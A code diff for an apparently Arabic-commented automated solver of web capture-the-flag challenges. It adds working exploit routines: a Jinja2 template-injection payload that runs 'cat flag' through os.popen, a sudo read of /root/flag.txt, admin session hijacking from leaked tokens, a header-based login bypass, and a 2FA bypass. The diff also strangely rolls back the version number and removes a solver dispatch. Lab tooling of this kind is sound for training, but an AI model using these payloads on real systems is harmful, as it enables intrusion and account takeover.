@@ -1,6 +1,3 @@
-Warning: truncated output (original token count: 28916)
-Total output lines: 2057
-
 # -*- coding: utf-8 -*-
 """
 CTF Falcon - Web Session Audit  (v2.3.0)
@@ -36,13 +33,12 @@ import sys
 import http.client
 import secrets
 import codecs
-import hashlib
 import html as html_lib
 from datetime import datetime, timezone
 from email.utils import parsedate_to_datetime
 from urllib.parse import urlsplit, urlencode, urljoin, quote
 
-__version__ = "2.20.0"
+__version__ = "2.19.0"
 
 # --------------------------------------------------------------------------- #
 DEFAULT_FLAG_PATTERNS = [
@@ -733,7 +729,544 @@ def solve_n0s4n1ty(client, origin, recon, ev, steps, record,
     except (OSError, http.client.HTTPException, ValueError) as e:
         res["warnings"].append(f"تعذّر فحص صلاحيات sudo: {e}.")
         return res
-    …10916 tokens truncated…),
+    res["discovered"]["sudo_nopasswd"] = bool(re.search(r"NOPASSWD\s*:\s*(?:ALL\b|/)", sudo["body"], re.I))
+    if not (200 <= sudo["status"] < 300) or not res["discovered"]["sudo_nopasswd"]:
+        res["explanation_ar"].append("لم يثبت رد sudo -l صلاحية NOPASSWD؛ لم يطلب صقر قراءة /root.")
+        res["warnings"].append("لم يظهر تصريح sudo بلا كلمة مرور في الاستجابة الفعلية.")
+        return res
+    try:
+        flag_resp = run_command("sudo cat /root/flag.txt", "قراءة /root/flag.txt بعد ثبوت تصريح NOPASSWD في sudo -l.")
+    except (OSError, http.client.HTTPException, ValueError) as e:
+        res["warnings"].append(f"تعذّرت قراءة ملف العلم: {e}.")
+        return res
+    flag, source = extract_flag([(f"step{len(steps)}:response", flag_resp["body"])], flag_patterns)
+    if flag and 200 <= flag_resp["status"] < 300:
+        res["success"], res["flag"] = True, flag
+        res["flag_source"] = source
+        res["explanation_ar"].append("استُخرج العلم من استجابة الخادم الفعلية.")
+    else:
+        res["warnings"].append("لم يظهر علم مطابق في استجابة قراءة الملف.")
+    return res
+
+
+
+def _request_ssti_form(client, method, url, body, record, note):
+    """Issue a form request and honor one same-origin 307/308 redirect."""
+    response = client.request(method, url, body=body)
+    record(response, [note])
+    if response["status"] in (307, 308) and response.get("location"):
+        redirected = urljoin(url, response["location"])
+        response = client.request(method, redirected, body=body)
+        record(response, [f"متابعة تحويل {response['status']} داخل أصل التحدي مع الحفاظ على POST."])
+    return response
+
+
+def solve_ssti1(client, origin, recon, ev, steps, bodies, record,
+                flag_patterns) -> dict:
+    res = _base_result(origin, "SSTI1", "ssti1", recognized=True)
+    res["steps"] = steps
+    res["discovered"] = {"form_action": ev["action"], "input_field": ev["field"],
+                         "input_fields": ev["fields"]}
+    res["explanation_ar"].append(
+        f"اكتُشف نموذج POST فعلي بالحقل «{ev['field']}». نتحقق أولًا بتعبير حسابي غير مدمّر.")
+    endpoint = urljoin(origin, ev["action"])
+    probe = urlencode({ev["field"]: "{{7*7}}"})
+    try:
+        r = _request_ssti_form(client, "POST", endpoint, probe, record,
+                               "اختبار حسابي آمن داخل حقل النموذج المكتشف.")
+    except (OSError, http.client.HTTPException, ValueError) as e:
+        res["warnings"].append(f"تعذّر اختبار النموذج أو متابعة تحويله: {e}.")
+        return res
+    evaluated = "49" in r["body"] and "{{7*7}}" not in r["body"]
+    res["discovered"]["ssti_confirmed"] = evaluated
+    if not evaluated:
+        res["explanation_ar"].append("لم يُثبت الاختبار الحسابي تقييم القالب؛ لم يُرسل طلب قراءة العلم.")
+        res["warnings"].append("النموذج موجود، لكن نتيجة 49 غير ظاهرة في الاستجابة.")
+        return res
+    res["explanation_ar"].append("أعادت الاستجابة 49، فتأكد تقييم تعبير Jinja2.")
+
+    payload = "{{ cycler.__init__.__globals__.os.popen('cat flag').read() }}"
+    body = urlencode({ev["field"]: payload})
+    try:
+        r2 = _request_ssti_form(client, "POST", endpoint, body, record,
+                                "إرسال تعبير Jinja2 المعروف لتحدي SSTI1، وقراءة ملف flag في مجلد التحدي.")
+    except (OSError, http.client.HTTPException, ValueError) as e:
+        res["warnings"].append(f"تعذّرت قراءة ملف العلم المتوقع في تحدي SSTI1: {e}.")
+        return res
+    flag, source = extract_flag([(f"step{len(steps)}:response", r2["body"])], flag_patterns)
+    if flag and 200 <= r2["status"] < 300:
+        res["success"], res["flag"] = True, flag
+        res["flag_source"] = source or f"HTTP {r2['status']} {ev['action']}"
+        res["explanation_ar"].append("استُخرج العلم من استجابة النموذج الفعلية بعد تأكيد SSTI.")
+    else:
+        res["warnings"].append("لم يظهر علم مطابق في استجابة النموذج.")
+        res["explanation_ar"].append("لم يُعلن أي علم لعدم وجوده في الاستجابة.")
+    return res
+
+
+def detect_old_sessions(recon) -> bool:
+    r = recon["resp"]
+    if r["status"] not in (301, 302, 303, 307, 308):
+        return False
+    if "/login" not in (r["location"] or ""):
+        return False
+    return any(c["name"] == "session" and c["intent"] == "set"
+               for c in analyze_response_cookies(r))
+
+
+# --------------------------------------------------------------------------- #
+#  محلل Crack the Gate                                                          #
+# --------------------------------------------------------------------------- #
+def solve_crack_the_gate(client, origin, recon, ev, steps, bodies, record,
+                         flag_patterns, opts) -> dict:
+    res = _base_result(origin, "Crack the Gate", "crack-the-gate", recognized=True)
+    res["steps"] = steps
+    warn = res["warnings"]; expl = res["explanation_ar"]
+
+    text_emails = extract_emails(opts.get("challenge_text") or "")
+    candidates = text_emails or recon["emails"]
+    email = opts.get("email") or (candidates[0] if len(candidates) == 1 else None)
+    if not email:
+        res["needs_input"] = [{"name": "email", "label_ar": "البريد المستخدم في التحدي", "candidates": candidates}]
+        res["explanation_ar"].append("اكتُشف مسار الدخول وترويسة المطوّر؛ يلزم تحديد بريد التحدي قبل إرسال طلب الدخول.")
+        return res
+    if not isinstance(email, str) or extract_emails(email) != [email]:
+        res["warnings"].append("البريد المدخل غير صالح.")
+        return res
+
+    expl.append(f"التعليق في الصفحة مُرمّز بـ ROT13؛ بعد فكّه: «{ev['comment_decoded']}».")
+    expl.append(f"دلّ التعليق على ترويسة مطوّر تتجاوز البوابة: {ev['dev_header']['name']}: {ev['dev_header']['value']}.")
+
+    login_url = urljoin(origin, ev["login_path"])
+    headers = {ev["dev_header"]["name"]: ev["dev_header"]["value"]}
+    if ev["json"]:
+        headers["Content-Type"] = "application/json"
+        body = json.dumps({"email": email, "password": TEST_PASSWORD})
+    else:
+        body = urlencode({"email": email, "password": TEST_PASSWORD})
+
+    expl.append(f"أرسلنا طلب دخول {'JSON' if ev['json'] else 'نموذجي'} إلى {ev['login_path']} "
+                f"بالبريد {email} وبالترويسة المكتشفة (كلمة مرور تجريبية غير محفوظة).")
+
+    try:
+        r = client.request(ev["method"] or "POST", login_url, body=body, extra_headers=headers)
+    except ValueError as e:
+        warn.append(f"رُفض الطلب: {e}.")
+        return res
+    except (OSError, http.client.HTTPException) as e:
+        warn.append(f"تعذّر إرسال طلب الدخول: {e}.")
+        return res
+
+    # لا نُظهر كلمة المرور في السجل: نسجّل الاستجابة فقط + ملاحظة عن الترويسة
+    record(r, [f"طلب الدخول عبر {ev['method']} {ev['login_path']} بالترويسة "
+               f"{ev['dev_header']['name']}: {ev['dev_header']['value']}."])
+    res["discovered"] = {
+        "comment_raw": ev["comment_raw"], "comment_decoded": ev["comment_decoded"],
+        "dev_header": ev["dev_header"], "login_path": ev["login_path"],
+        "email_used": email, "response_status": r["status"], "response_content_type": r["content_type"],
+    }
+
+    # قراءة الاستجابة الحقيقية
+    parsed, success_flag, flag = None, None, None
+    flag_response = r
+    try:
+        parsed = json.loads(r["body"])
+    except (json.JSONDecodeError, ValueError):
+        parsed = None
+    if isinstance(parsed, dict):
+        success_flag = parsed.get("success")
+        if isinstance(parsed.get("flag"), str):
+            flag = parsed["flag"]
+    if not flag:
+        flag, _src = extract_flag([("login-response", r["body"])], flag_patterns)
+
+    if not (200 <= r["status"] < 300) or success_flag is False:
+        flag = None
+
+    # تحويل من نفس الأصل؟ نعيد التحقق ونطلب الوجهة مرة واحدة
+    if not flag and r["status"] in (301, 302, 303, 307, 308) and r["location"]:
+        try:
+            r2 = client.request("GET", urljoin(origin, r["location"]))
+            record(r2, ["متابعة تحويل الاستجابة (نفس الأصل) لقراءة العلم."])
+            if 200 <= r2["status"] < 300:
+                flag, _s2 = extract_flag([("redirect-body", r2["body"])], flag_patterns)
+                flag_response = r2
+        except ValueError:
+            warn.append("التحويل كان لمضيف مختلف؛ أُوقف للحفاظ على أصل التحدي.")
+        except (OSError, http.client.HTTPException) as e:
+            warn.append(f"تعذّرت متابعة التحويل: {e}.")
+
+    if flag:
+        res["success"] = True
+        res["flag"] = flag
+        res["flag_source"] = f"HTTP {flag_response['status']} على {flag_response['url']}"
+        expl.append("أعادت الاستجابة الحقيقية العلم بعد تجاوز البوابة بالترويسة.")
+    else:
+        if r["status"] == 401 or success_flag is False:
+            warn.append(f"رفض الخادم الدخول (الحالة {r['status']})؛ لم يُستخرج علم.")
+        elif r["status"] == 404:
+            warn.append(f"مسار الدخول {ev['login_path']} غير موجود (404).")
+        elif success_flag is True:
+            warn.append("نجح الدخول لكن الاستجابة لم تتضمّن علمًا.")
+        else:
+            warn.append(f"استجابة غير متوقعة (الحالة {r['status']})؛ لم يُستخرج علم.")
+        expl.append("لم يُعلَن أي علم لعدم وجود استجابة حقيقية تُثبته.")
+    return res
+
+
+# --------------------------------------------------------------------------- #
+#  محلل Old Sessions (مشروط بالأدلة، وسرد يعكس النتائج الفعلية)                  #
+# --------------------------------------------------------------------------- #
+def solve_old_sessions(client, origin, recon, steps, bodies, record,
+                       flag_patterns, opts) -> dict:
+    res = _base_result(origin, "Old Sessions", "old-sessions", recognized=True)
+    res["steps"] = steps
+    warn = res["warnings"]; expl = res["explanation_ar"]
+    disc = res["discovered"]
+
+    r1 = recon["resp"]  # مُسجَّل مسبقًا كالخطوة 1
+    login_path = r1["location"] or "/login"
+    expl.append(f"الصفحة الرئيسية أنشأت كوكي جلسة وحوّلت إلى {login_path}.")
+
+    def finish():
+        flag, src = extract_flag(bodies, flag_patterns)
+        if flag:
+            res["success"] = True; res["flag"] = flag; res["flag_source"] = src
+        return res
+
+    # (2) /login — مبرَّر بالتحويل
+    try:
+        r2 = client.request("GET", urljoin(origin, login_path))
+    except (OSError, http.client.HTTPException, ValueError) as e:
+        warn.append(f"تعذّر فتح صفحة الدخول: {e}."); return finish()
+    record(r2, ["فحص صفحة الدخول: نتوقع نموذجًا ورابط تسجيل."])
+    if any(c["intent"] == "deletion" for c in analyze_response_cookies(r2)):
+        expl.append("صفحة الدخول حذفت كوكي الجلسة (Max-Age<=0).")
+    if "/register" not in r2["body"]:
+        warn.append("لا يوجد رابط /register في صفحة الدخول؛ تُوقّف المسار عند الدليل المتاح.")
+        return finish()
+
+    # (3) /register — مبرَّر برابط في صفحة الدخول
+    reg_url = urljoin(origin, "/register")
+    r3 = client.request("GET", reg_url)
+    record(r3, ["فحص صفحة التسجيل واكتشاف الحقول."])
+    reg_fields = find_form_fields(r3["body"])
+    disc["register_fields"] = reg_fields
+    if r3["status"] != 200 or not reg_fields:
+        warn.append(f"صفحة /register غير متوقعة (الحالة {r3['status']})؛ توقّف المسار.")
+        return finish()
+
+    username = opts.get("username") or ("falcon_" + secrets.token_hex(4))
+    password = opts.get("password") or secrets.token_hex(8)
+
+    # (اختياري تعليميًا) إثبات أن conf_password مطلوب
+    if opts.get("demonstrate_register_requirement") and "conf_password" in reg_fields:
+        rp = client.request("POST", reg_url, body=urlencode({"username": username, "password": password}))
+        record(rp, ["إثبات المتطلب: تسجيل بدون conf_password — الحالة الفعلية أدناه."])
+        if rp["status"] == 400:
+            expl.append("تأكّد أن conf_password مطلوب (تسجيل ناقص أعاد 400).")
+
+    # (4) تسجيل صحيح بالحقول المكتشفة فقط
+    reg_payload = {"username": username, "password": password}
+    if "conf_password" in reg_fields:
+        reg_payload["conf_password"] = password
+    r4 = client.request("POST", reg_url, body=urlencode(reg_payload))
+    record(r4, ["تسجيل حساب تجريبي بالحقول المكتشفة."])
+    if r4["status"] not in (200, 302):
+        warn.append(f"فشل التسجيل (الحالة {r4['status']})؛ توقّف المسار.")
+        return finish()
+    expl.append("أنشأنا حسابًا تجريبيًا داخل التحدي.")
+
+    # (5) تسجيل الدخول
+    r5 = client.request("POST", urljoin(origin, "/login"),
+                        body=urlencode({"username": username, "password": password}))
+    record(r5, ["تسجيل الدخول بالحساب التجريبي."])
+    own = client.cookies.get("session")
+    if r5["status"] not in (200, 302) or not own:
+        warn.append(f"تعذّر تسجيل الدخول (الحالة {r5['status']})؛ توقّف المسار.")
+        return finish()
+    disc["own_session_token"] = _mask(own)
+    expl.append("سجّلنا الدخول وحصلنا على كوكي جلسة.")
+
+    # (6) الصفحة الرئيسية بعد الدخول — البحث عن إشارة فعلية
+    r6 = client.request("GET", origin)
+    record(r6, ["الصفحة الرئيسية بعد الدخول: البحث عن إشارة لصفحة مخفية."])
+    hint = find_sessions_hint(r6["body"])
+    if not hint:
+        warn.append("لم تظهر إشارة إلى صفحة جلسات؛ توقّف المسار.")
+        return finish()
+    disc["sessions_hint"] = hint
+    expl.append(f"الصفحة كشفت إشارة إلى {hint}.")
+
+    # (7) /sessions — مبرَّر بالإشارة
+    sess_url = urljoin(origin, hint)
+    r7 = client.request("GET", sess_url)
+    record(r7, [f"طلب {hint}: نتوقع تسريب جلسات الخادم."])
+    disc["sessions_url"] = sess_url
+    if r7["status"] != 200:
+        warn.append(f"صفحة {hint} غير متاحة (الحالة {r7['status']})؛ توقّف المسار.")
+        return finish()
+    entries = parse_sessions_dump(r7["body"])
+    disc["sessions_count"] = len(entries)
+    admin = pick_admin_entry(entries, own)
+    expl.append(f"صفحة {hint} سرّبت {len(entries)} جلسة خادم.")
+    if not admin:
+        warn.append("لم يتحدد رمز جلسة المشرف من التسريب.")
+        return finish()
+    disc["admin_session_token"] = admin["token"]      # أداة الاستغلال (لا تُعرض في واجهة السجل)
+    disc["admin_session_decoded"] = admin["decoded"]
+
+    # (8) انتحال جلسة المشرف
+    client.cookies["session"] = admin["token"]
+    r8 = client.request("GET", origin)
+    record(r8, ["انتحال جلسة المشرف: ضبط كوكي session على الرمز المسرّب ثم طلب /."])
+    expl.append("استبدلنا كوكي جلستنا برمز جلسة المشرف المسرّب.")
+
+    out = finish()
+    if out["success"]:
+        expl.append("استُخرج العلم بصفة مشرف.")
+    else:
+        warn.append("لم يظهر علم بعد الانتحال؛ راجِع الأدلة.")
+    return out
+
+
+# --------------------------------------------------------------------------- #
+#  تحديات تعتمد على مصدر الصفحة/الموارد أو معرّفات معروفة من وصف التحدي          #
+# --------------------------------------------------------------------------- #
+_STATIC_CHALLENGES = {
+    "cookie monster secret recipe": ("Cookie Monster Secret Recipe", "cookie-monster"),
+    "ookie monster secret recipe": ("Cookie Monster Secret Recipe", "cookie-monster"),
+    "webdecode": ("WebDecode", "webdecode"),
+    "unminify": ("Unminify", "unminify"),
+    "intro to burp": ("IntroToBurp", "intro-to-burp"),
+    "introtoburp": ("IntroToBurp", "intro-to-burp"),
+    "bookmarklet": ("Bookmarklet", "bookmarklet"),
+    "local authority": ("Local Authority", "local-authority"),
+    "inspect html": ("Inspect HTML", "inspect-html"),
+    "includes": ("Includes", "includes"),
+    "scavenger hunt": ("Scavenger Hunt", "scavenger-hunt"),
+    "dont-use-client-side": ("dont-use-client-side", "dont-use-client-side"),
+    "don't use client side": ("dont-use-client-side", "dont-use-client-side"),
+    "logon": ("logon", "logon"),
+    "insp3ct0r": ("Insp3ct0r", "insp3ct0r"),
+    "where are the robots": ("where are the robots", "robots"),
+    "get ahead": ("GET aHEAD", "get-ahead"),
+    "getahead": ("GET aHEAD", "get-ahead"),
+    "no fa": ("No FA", "no-fa"),
+    "hashgate": ("Hashgate", "hashgate"),
+    "credential stuffing": ("Credential Stuffing", "credential-stuffing"),
+    "secret box": ("Secret Box", "secret-box"),
+    "cookies": ("Cookies", "cookies-2021"),
+}
+
+_STATIC_GUIDANCE = {
+    "intro-to-burp": "يسجل صقر حسابًا تجريبيًا من النموذج المكتشف. في مرحلة 2FA يرسل POST فارغًا بلا حقل otp، ثم يقرأ العلم من الاستجابة؛ هذا يشرح أثر التحقق من وجود الحقل بدل التحقق من الرمز.",
+    "no-fa": "يحتاج هذا التحدي عنوان Instance الحي وملف users.db. رابط users.db ملف بيانات وليس صفحة ويب؛ تُحلّل التجزئات محليًا بقائمة rockyou، ثم يُختبر تسجيل الدخول ومرحلة 2FA على الـInstance فقط.",
+    "hashgate": "تُظهر الصفحة معرّف المستخدم؛ افحص تحقق الخادم من المعرّف المجزأ، ثم اختبر معرّفات الموظفين المحدودة التي يثبتها وصف التحدي.",
+    "credential-stuffing": "هذا تحدٍ عبر TCP وملف بيانات اعتماد منفصل، وليس صفحة HTTP. شغّل المحلل الطرفي على ملف creds-dump المرفق مع تأخير وحد أقصى للمحاولات ضمن خدمة التحدي فقط.",
+    "secret-box": "افحص مصدر التطبيق المرفق. مسار إنشاء السر يضمّن المحتوى في SQL؛ أنشئ حسابًا تدريبيًا واستخدم ثغرة المسار لنسخ سر المشرف، ثم اقرأ السر بحسابك.",
+    "bookmarklet": "ابحث عن bookmarklet في المصدر؛ اقرأ دالة فك النص ونفّذ تحويلها محليًا على السلسلة المضمّنة.",
+    "local-authority": "يتبع صقر مسار النموذج إلى login.php، ويقرأ secure.js المرتبط، ثم يستخدم الاعتمادين الموجودين فيه لإكمال نموذج المشرف المكتشف.",
+    "cookie-monster": "افحص نموذج الدخول والكوكي التي يعيدها الخادم؛ فك الترميز Base64/URL محليًا بعد رصدها.",
+    "cookies-2021": "يجرّب صقر قيم كوكي name الرقمية ضمن هذا التحدي، ويتبع تحويلات GET التي يعيدها التطبيق حتى يصل إلى صفحة التحقق؛ تظهر الاستجابات بالتسلسل.",
+    "scavenger-hunt": "يتتبع صقر القرائن بين مصدر HTML وCSS وJavaScript وrobots.txt؛ توجّه عبارة Apache وAccess إلى .htaccess، وقرينة Mac وStore إلى .DS_Store. يجمع أجزاء العلم حسب أرقامها.",
+    "logon": "يجرب صقر Joe أولًا، ثم يتبع التلميح إن كان التطبيق يتحقق من كلمة مروره وحده. يضبط admin=True قبل اتباع مسار التحويل الذي يكشفه POST، مثل /flag.",
+    "get-ahead": "يقرأ صقر مسارات أزرار GET وPOST الظاهرة، ثم يرسل HEAD إلى مسار النموذج نفسه ويفحص رؤوس الاستجابة بحثًا عن العلم.",
+    "dont-use-client-side": "يحلل صقر شروط substring الموجودة في JavaScript المضمّن، ويرتب مقاطع كلمة المرور حسب مواقعها لإظهار العلم وشرح أن التحقق يجري في المتصفح.",
+}
+
+
+def detect_named_challenge(challenge_text: str | None):
+    text = challenge_text or ""
+    # Challenge text is pasted with its title on a standalone first line. Match
+    # titles at line starts to avoid treating prose like "this includes ..." as
+    # the legacy challenge named Includes.
+    for needle in sorted(_STATIC_CHALLENGES, key=len, reverse=True):
+        title = re.compile(r"(?im)^\s*(?:#{1,6}\s*)?" + re.escape(needle) + r"(?=\s|$|[—-])")
+        if title.search(text):
+            return _STATIC_CHALLENGES[needle]
+    return None
+
+
+def _hidden_form_values(html: str) -> dict[str, str]:
+    values = {}
+    for tag in re.findall(r"<input\b[^>]*>", html, re.I | re.S):
+        typ = re.search(r"\btype\s*=\s*(['\"]?)([^\s>'\"]+)\1", tag, re.I)
+        name = re.search(r"\bname\s*=\s*(['\"])(.*?)\1", tag, re.I | re.S)
+        value = re.search(r"\bvalue\s*=\s*(['\"])(.*?)\1", tag, re.I | re.S)
+        if name and value and (not typ or typ.group(2).lower() == "hidden"):
+            values[html_lib.unescape(name.group(2))] = html_lib.unescape(value.group(2))
+    return values
+
+
+def solve_intro_to_burp(client, origin, recon, steps, bodies, record,
+                        flag_patterns) -> dict:
+    res = _base_result(origin, "IntroToBurp", "intro-to-burp", recognized=True)
+    res["steps"] = steps
+    reg = next((f for f in recon.get("forms", []) if f.get("method") == "POST" and
+                {x.lower() for x in f.get("fields", [])}.issuperset(
+                    {"full_name", "username", "phone_number", "city", "password"})), None)
+    res["discovered"] = {"registration_fields": reg.get("fields", []) if reg else [],
+                         "csrf_protected": bool(re.search(r"name=['\"]csrf_token['\"]", recon.get("html", ""), re.I))}
+    if not reg:
+        res["warnings"].append("لم يظهر نموذج التسجيل المتوقع؛ أوقف صقر التنفيذ دون إرسال بيانات.")
+        return res
+
+    values = _hidden_form_values(recon["html"])
+    username = "falcon" + secrets.token_hex(5)
+    for field in reg["fields"]:
+        low = field.lower()
+        if field in values:
+            continue
+        if low == "full_name": values[field] = "Falcon Student"
+        elif low == "username": values[field] = username
+        elif low == "phone_number": values[field] = "0000000000"
+        elif low == "city": values[field] = "Muscat"
+        elif low == "password": values[field] = TEST_PASSWORD
+        elif low == "submit": values[field] = "Register"
+    if not all(any(k.lower() == f for k in values) for f in ("full_name", "username", "phone_number", "city", "password")):
+        res["warnings"].append("تعذر ملء حقول التسجيل المكتشفة بأمان؛ لم يُرسل النموذج.")
+        return res
+
+    registration_url = urljoin(origin, reg.get("action") or "")
+    try:
+        posted = client.request("POST", registration_url, urlencode(values))
+        record(posted, ["أرسل صقر بيانات تدريبية إلى حقول التسجيل التي كشفها النموذج؛ كلمة المرور لا تُعرض في السجل."])
+    except (OSError, http.client.HTTPException, ValueError) as e:
+        res["warnings"].append(f"تعذر إرسال التسجيل: {e}")
+        return res
+    if posted["status"] not in (301, 302, 303, 307, 308) or not posted.get("location"):
+        res["warnings"].append("لم يعطِ التسجيل تحويلًا ناجحًا معلنًا؛ لم يُجرّب مسار 2FA.")
+        return res
+    dashboard_url = urljoin(registration_url, posted["location"])
+    if urlsplit(dashboard_url).netloc != urlsplit(origin).netloc:
+        res["warnings"].append("حُظر تحويل التسجيل إلى أصل آخر.")
+        return res
+    try:
+        dashboard = client.request("GET", dashboard_url)
+        record(dashboard, ["اتبع صقر تحويل التسجيل الذي أعاده الخادم إلى صفحة الخطوة التالية."])
+    except (OSError, http.client.HTTPException, ValueError) as e:
+        res["warnings"].append(f"تعذر فتح الصفحة التالية: {e}")
+        return res
+    otp_form = next((f for f in find_forms(dashboard["body"])
+                     if f.get("method") == "POST" and any(x.lower() == "otp" for x in f.get("fields", []))), None)
+    if not otp_form:
+        res["warnings"].append("لم يظهر نموذج POST بحقل otp بعد التسجيل؛ توقف صقر دون تعديل الطلب.")
+        return res
+
+    otp_url = urljoin(dashboard_url, otp_form.get("action") or "")
+    if urlsplit(otp_url).netloc != urlsplit(origin).netloc:
+        res["warnings"].append("حُظر نموذج OTP الذي يشير إلى أصل آخر.")
+        return res
+    try:
+        # Deliberately omit the otp field. This is the challenge's malformed
+        # request lesson, and it is reachable only after the challenge title
+        # and both real forms have been confirmed.
+        otp_hidden = _hidden_form_values(dashboard["body"])
+        bypass = client.request("POST", otp_url, urlencode(otp_hidden) if otp_hidden else "")
+        record(bypass, ["اختبر صقر خلل IntroToBurp المحدد: أرسل النموذج بلا حقل otp، بعد إثبات وجود النموذج الفعلي."])
+    except (OSError, http.client.HTTPException, ValueError) as e:
+        res["warnings"].append(f"تعذر إرسال طلب الاختبار: {e}")
+        return res
+    flag, source = extract_flag([(f"step{len(steps)}:empty-otp-response", bypass["body"])], flag_patterns)
+    if not flag and bypass.get("location") and bypass["status"] in (301, 302, 303, 307, 308):
+        next_url = urljoin(otp_url, bypass["location"])
+        if urlsplit(next_url).netloc == urlsplit(origin).netloc:
+            try:
+                final = client.request("GET", next_url)
+                record(final, ["قراءة الصفحة التي أعلن عنها تحويل نتيجة 2FA ضمن أصل التحدي."])
+                flag, source = extract_flag([(f"step{len(steps)}:post-otp-page", final["body"])], flag_patterns)
+            except (OSError, http.client.HTTPException, ValueError):
+                pass
+    if flag:
+        res["success"], res["flag"], res["flag_source"] = True, flag, source
+        res["explanation_ar"].append("أعاد الخادم العلم بعد طلب POST لا يحتوي حقل otp؛ هذا يثبت خلل التحقق في مسار التحدي.")
+    else:
+        res["warnings"].append("لم تُرجع استجابة طلب OTP الفارغ علمًا؛ راجع حالة الاستجابة ونصها.")
+    return res
+
+
+def _redact_response_body(resp: dict, secrets_to_hide: list[str]) -> dict:
+    safe = dict(resp)
+    body = safe.get("body", "")
+    for value in sorted({x for x in secrets_to_hide if x}, key=len, reverse=True):
+        body = body.replace(value, "[hidden]")
+    safe["body"] = body
+    return safe
+
+
+def solve_local_authority(client, origin, recon, steps, bodies, record,
+                          flag_patterns) -> dict:
+    res = _base_result(origin, "Local Authority", "local-authority", recognized=True)
+    res["steps"] = steps
+    login_form = next((f for f in recon.get("forms", []) if f.get("method") == "POST" and
+                       {x.lower() for x in f.get("fields", [])}.issuperset({"username", "password"})), None)
+    res["discovered"] = {"login_fields": login_form.get("fields", []) if login_form else []}
+    if not login_form:
+        res["warnings"].append("لم يظهر نموذج POST يحوي اسم المستخدم وكلمة المرور؛ لم تُرسل بيانات دخول.")
+        return res
+
+    login_url = urljoin(origin, login_form.get("action") or "")
+    if urlsplit(login_url).netloc != urlsplit(origin).netloc:
+        res["warnings"].append("حُظر نموذج دخول يشير إلى أصل آخر.")
+        return res
+    try:
+        login_page = client.request("GET", login_url)
+        record(login_page, ["فتح صقر وجهة نموذج الدخول التي ظهرت في HTML؛ يفحص الصفحة للعثور على تحقق العميل وموارده."])
+    except (OSError, http.client.HTTPException, ValueError) as e:
+        res["warnings"].append(f"تعذر فتح وجهة النموذج: {e}")
+        return res
+
+    scripts = [u for u in _page_resources(login_page["body"], login_url)
+               if urlsplit(u).path.lower().endswith(".js")]
+    credential_pair = None
+    credential_source = None
+    for script_url in scripts[:8]:
+        try:
+            js = client.request("GET", script_url)
+            match = re.search(r"function\s+checkPassword\s*\([^)]*\)\s*\{(.*?)\}", js["body"], re.I | re.S)
+            if match:
+                block = match.group(1)
+                um = re.search(r"\busername\s*={2,3}\s*(['\"])([A-Za-z0-9]{1,64})\1", block, re.I)
+                pm = re.search(r"\bpassword\s*={2,3}\s*(['\"])([A-Za-z0-9]{1,64})\1", block, re.I)
+                if um and pm:
+                    credential_pair = (um.group(2), pm.group(2))
+                    credential_source = urlsplit(script_url).path
+            record(_redact_response_body(js, list(credential_pair or ())),
+                   ["قراءة JavaScript مرتبط بصفحة الدخول؛ حُجبت أي بيانات اعتماد من سجل الاستجابة."])
+        except (OSError, http.client.HTTPException, ValueError):
+            continue
+    if not credential_pair:
+        res["warnings"].append("لم يعثر صقر في JavaScript المرتبط على مقارنة اسم مستخدم وكلمة مرور؛ لم يجرّب بيانات مخمّنة.")
+        return res
+
+    username, password = credential_pair
+    res["discovered"]["credential_source"] = credential_source
+    res["explanation_ar"].append("وجد صقر المقارنة الصريحة داخل دالة checkPassword في JavaScript؛ لم يخمّن بيانات الدخول.")
+    values = {}
+    for field in login_form["fields"]:
+        low = field.lower()
+        if low == "username": values[field] = username
+        elif low == "password": values[field] = password
+        elif low == "login": values[field] = "Login"
+    try:
+        login_response = client.request("POST", login_url, urlencode(values))
+        reflected_user = re.search(r"window\.username\s*=\s*(['\"])" + re.escape(username) + r"\1", login_response["body"], re.I)
+        reflected_pass = re.search(r"window\.password\s*=\s*(['\"])" + re.escape(password) + r"\1", login_response["body"], re.I)
+        login_html = login_response["body"]
+        form_evidence = next((f for f in find_forms(login_html)
+                              if "hash" in [x.lower() for x in f.get("fields", [])] and f.get("action")), None)
+        hash_input = None
+        for tag in re.findall(r"<input\b[^>]*>", login_html, re.I | re.S):
+            name = re.search(r"\bname\s*=\s*(['\"])hash\1", tag, re.I)
+            value = re.search(r"\bvalue\s*=\s*(['\"])(.*?)\1", tag, re.I | re.S)
+            if name and value:
+                hash_input = html_lib.unescape(value.group(2)); break
+        if not hash_input:
+            hv = re.search(r"adminFormHash['\"]?\s*\)\s*\.value\s*=\s*(['\"])(.*?)\1", login_html, re.I | re.S)
+            if hv:
+                hash_input = html_lib.unescape(hv.group(2))
+        record(_redact_response_body(login_response, [username, password, hash_input or ""]),
                ["أرسل صقر بيانات الاعتماد المطابقة للمصدر إلى نموذج POST المكتشف؛ حُجبت القيم من السجل."])
     except (OSError, http.client.HTTPException, ValueError) as e:
         res["warnings"].append(f"تعذر إرسال بيانات الدخول المكتشفة: {e}")
@@ -1324,8 +1857,6 @@ def run_audit(url: str,
 
     named = detect_named_challenge(challenge_text)
     if named:
-        if named[1] == "hashgate":
-            return solve_hashgate(client, origin, recon, steps, bodies, record, flag_patterns)
         if named[1] == "intro-to-burp":
             return solve_intro_to_burp(client, origin, recon, steps, bodies, record, flag_patterns)
         if named[1] == "local-authority":
